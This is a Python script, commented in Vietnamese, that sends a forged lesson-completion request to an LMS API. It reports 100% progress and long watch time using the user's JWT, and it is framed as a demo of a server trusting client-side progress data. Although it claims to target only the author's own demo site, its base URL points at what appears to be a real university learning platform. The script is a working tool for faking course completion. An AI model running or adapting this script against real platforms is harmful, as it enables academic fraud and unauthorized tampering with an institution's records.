"""
Demo: Client-Side Trust Bypass
-------------------------------
Mục đích: Minh họa lỗ hổng bảo mật khi server tin tưởng hoàn toàn vào tín hiệu
"đã hoàn thành" do CLIENT gửi lên, mà không tự kiểm tra logic (thời gian xem,
% video, v.v.) ở phía SERVER.

CHỈ DÙNG cho web demo do tui tự dựng để học/test bảo mật.
KHÔNG dùng để bypass hệ thống thật mà tui không sở hữu/được phép test.

Cách hoạt động:
  - Bình thường: client phải xem video đủ lâu -> JS tự động gọi API complete
  - Ở đây: ta gọi thẳng API complete bằng Python, không cần xem gì cả
  -> Nếu API trả về 200/success ngay, tức là server không có kiểm tra phía
     server-side (đây chính là lỗ hổng cần fix).
"""

import requests
import json

# ====== CẤU HÌNH - sửa lại theo web demo của tui ======
BASE_URL = "https://apps.lms.hutech.edu.vn"          # domain/port web demo
ENDPOINT = "/api/lessons/complete"          # endpoint đánh dấu hoàn thành

JWT_TOKEN = "PASTE_YOUR_JWT_TOKEN_HERE"     # lấy từ DevTools > Application > Local/Storage hoặc login response

# Payload thường cần các field như lesson_id, user_id, progress...
# Sửa lại đúng theo schema API thật của tui (xem qua Network tab khi học bình thường)
PAYLOAD = {
    "lesson_id": "intro_lesson",
    "progress_percent": 100,     # giả mạo: báo đã xem 100% dù chưa xem gì
    "watched_seconds": 9999,     # giả mạo: báo đã xem rất lâu
    "completed": True
}


def send_fake_complete():
    url = f"{BASE_URL}{ENDPOINT}"
    headers = {
        "Content-Type": "application/json",
        "Authorization": f"Bearer {JWT_TOKEN}"
    }

    print(f"[*] Gửi POST giả lập hoàn thành -> {url}")
    print(f"[*] Payload: {json.dumps(PAYLOAD, ensure_ascii=False)}")

    resp = requests.post(url, headers=headers, json=PAYLOAD)

    print(f"\n[+] Status code: {resp.status_code}")
    try:
        print(f"[+] Response: {json.dumps(resp.json(), indent=2, ensure_ascii=False)}")
    except ValueError:
        print(f"[+] Response (raw text): {resp.text}")

    # Đánh giá kết quả demo
    if resp.status_code in (200, 201):
        print("\n[!] LỖ HỔNG: Server đã chấp nhận tín hiệu hoàn thành giả mạo")
        print("    => Cần thêm kiểm tra phía SERVER (vd: server tự tính thời")
        print("       gian xem qua heartbeat, không tin số liệu client gửi lên)")
    else:
        print("\n[OK] Server đã từ chối request giả mạo - có thể đã có bảo vệ")


if __name__ == "__main__":
    send_fake_complete()
